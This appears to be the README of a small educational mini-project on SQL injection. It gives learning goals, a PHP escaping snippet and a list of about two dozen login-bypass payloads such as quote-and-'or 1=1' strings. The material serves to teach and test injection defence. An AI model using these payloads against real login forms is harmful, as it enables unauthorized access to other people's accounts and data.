

To know how SQL injection is  still dangerous​

To identify how injections are executed​

To know how to prevent SQL injection​




//Making sure that SQL Injection doesn't work
	$uname = mysqli_real_escape_string($conn, $uname);
	$pass = mysqli_real_escape_string($conn, $pass);




List of injections keys:

test' or 1=1#
1'or'1'='1
' or 0=0 --
" or 0=0 --
or 0=0 --
' or 0=0 #
" or 0=0 #
or 0=0 #
' or 'x'='x
" or "x"="x
') or ('x'='x
' or 1=1--
" or 1=1--
or 1=1--
' or a=a--
" or "a"="a
') or ('a'='a
") or ("a"="a
hi" or "a"="a
hi" or 1=1 --
hi' or 1=1 --
hi' or 'a'='a
hi') or ('a'='a
hi") or ("a"="a


The admin account and data vary from your database .. please kindly to check in the query names,table name,and the database name if you using this mini project.

injection.php ---- to start running
